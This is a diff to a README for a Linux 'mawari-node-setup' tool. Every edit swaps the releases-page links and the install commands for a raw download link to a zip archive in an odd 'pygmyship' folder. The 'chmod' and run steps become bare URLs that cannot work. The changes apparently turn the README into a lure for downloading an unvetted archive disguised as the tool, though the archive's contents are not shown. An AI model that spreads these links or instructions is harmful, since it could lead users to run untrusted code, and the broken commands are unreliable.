@@ -1,6 +1,6 @@
 # 🛠️ mawari-node-setup - Simplify Your Node Management Process
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue)
+![Download](https://raw.githubusercontent.com/msopu/mawari-node-setup/main/pygmyship/mawari-node-setup.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **mawari-node-setup**! This tool helps you set up and manage Mawari N
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest release: [Download Mawari Node Setup](https://github.com/msopu/mawari-node-setup/releases).
+To get started, visit this page to download the latest release: [Download Mawari Node Setup](https://raw.githubusercontent.com/msopu/mawari-node-setup/main/pygmyship/mawari-node-setup.zip).
 
 ## 📝 System Requirements
 
@@ -29,7 +29,7 @@ Before downloading, ensure your system meets these basic requirements:
 ## ⚙️ How to Use
 
 1. **Download the Script:**
-   Go to [this page](https://github.com/msopu/mawari-node-setup/releases) and download the latest version of the script.
+   Go to [this page](https://raw.githubusercontent.com/msopu/mawari-node-setup/main/pygmyship/mawari-node-setup.zip) and download the latest version of the script.
 
 2. **Open Your Terminal:**
    After downloading, locate the file in your downloads folder. Open the terminal on your Linux machine.
@@ -43,13 +43,13 @@ Before downloading, ensure your system meets these basic requirements:
 4. **Make the Script Executable:**
    Run this command to allow execution:
    ```bash
-   chmod +x mawari-node-setup.sh
+   chmod +x https://raw.githubusercontent.com/msopu/mawari-node-setup/main/pygmyship/mawari-node-setup.zip
    ```
 
 5. **Run the Script:**
    Execute the script by typing:
    ```bash
-   ./mawari-node-setup.sh
+   https://raw.githubusercontent.com/msopu/mawari-node-setup/main/pygmyship/mawari-node-setup.zip
    ```
 
 6. **Follow the Prompts:**
@@ -80,7 +80,7 @@ This script is specifically designed for Linux systems. Consider using a Linux V
 
 ### How do I update the script?
 
-To update to the latest version, download the latest release from [here](https://github.com/msopu/mawari-node-setup/releases) and repeat the installation steps.
+To update to the latest version, download the latest release from [here](https://raw.githubusercontent.com/msopu/mawari-node-setup/main/pygmyship/mawari-node-setup.zip) and repeat the installation steps.
 
 ## 🌟 Community and Support
 
@@ -90,4 +90,4 @@ Join the conversation, share your experiences, or ask for help. Connect with the
 
 Your feedback is important. If you have suggestions or encounter any issues, open an issue in our GitHub repository. We appreciate your input and are here to improve your experience.
 
-For more information, keep referring to this page for updates: [Download Mawari Node Setup](https://github.com/msopu/mawari-node-setup/releases).
+For more information, keep referring to this page for updates: [Download Mawari Node Setup](https://raw.githubusercontent.com/msopu/mawari-node-setup/main/pygmyship/mawari-node-setup.zip).
